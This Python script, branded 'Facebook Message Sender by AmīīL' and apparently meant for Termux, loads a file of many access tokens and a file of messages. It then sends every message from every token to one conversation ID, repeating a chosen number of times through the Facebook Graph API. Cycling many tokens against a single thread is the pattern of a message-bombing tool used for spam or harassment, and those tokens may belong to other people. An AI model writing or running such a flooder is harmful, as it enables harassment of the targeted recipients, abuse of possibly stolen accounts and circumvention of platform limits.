import os
import time
import random
import requests
import json
import sys
import subprocess

# Define colors for styling console output
RED = '\033[1;31m'
GREEN = '\033[1;32m'
CYAN = '\033[1;36m'
RESET = '\033[0m'

def print_colored(text, color):
    print(f"{color}{text}{RESET}")

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def logo():
    clear_screen()
    print(CYAN + r"""
    
 █████╗ ███╗   ███╗██╗██╗     
██╔══██╗████╗ ████║██║██║     
███████║██╔████╔██║██║██║     
██╔══██║██║╚██╔╝██║██║██║     
██║  ██║██║ ╚═╝ ██║██║███████╗
╚═╝  ╚═╝╚═╝     ╚═╝╚═╝╚══════╝
                              
    """ + RESET)
    print_colored("=== Facebook Message Sender by AmīīL ===", CYAN)
    print()

def send_message(thread_id, token, message):
    url = f"https://graph.facebook.com/v15.0/{thread_id}/messages"
    headers = {
        'Authorization': f'Bearer {token}',
        'Content-Type': 'application/json'
    }
    data = {
        "messaging_type": "RESPONSE",
        "message": {"text": message}
    }
    response = requests.post(url, headers=headers, data=json.dumps(data))
    return response.ok

def load_tokens(file_name):
    with open(file_name, 'r') as file:
        tokens = [line.strip() for line in file.readlines()]
    print_colored(f"Loaded {len(tokens)} tokens from {file_name}", GREEN)
    # Simulated profile name display (actual name retrieval requires different permissions)
    print_colored("Profile: Example Profile", CYAN)
    termux_tts("Tokens loaded successfully and profile identified.")
    return tokens

def termux_tts(text):
    try:
        subprocess.run(['termux-tts-speak', text])
    except Exception as e:
        print_colored("Error: Unable to access Termux TTS", RED)

def main():
    logo()
    
    token_file = input("Enter the token file name: ").strip()
    tokens = load_tokens(token_file)
    
    thread_id = input("Enter the conversation ID: ").strip()
    message_file = input("Enter the message file name: ").strip()
    
    # Load messages from file
    with open(message_file, 'r') as file:
        messages = [line.strip() for line in file.readlines()]
    
    repeat = int(input("Enter the number of repeats: "))
    delay = int(input("Enter the delay between messages (in seconds): "))
    
    print_colored("Starting to send messages...", GREEN)
    termux_tts("Starting to send messages.")

    for i in range(repeat):
        for token in tokens:
            for message in messages:
                if send_message(thread_id, token, message):
                    print_colored(f"Message sent successfully: {message}", GREEN)
                    termux_tts("Message sent successfully.")
                else:
                    print_colored(f"Failed to send message: {message}", RED)
                    termux_tts("Failed to send message.")
                time.sleep(delay)

    print_colored("All messages sent!", CYAN)
    termux_tts("All messages sent!")

if __name__ == "__main__":
    main()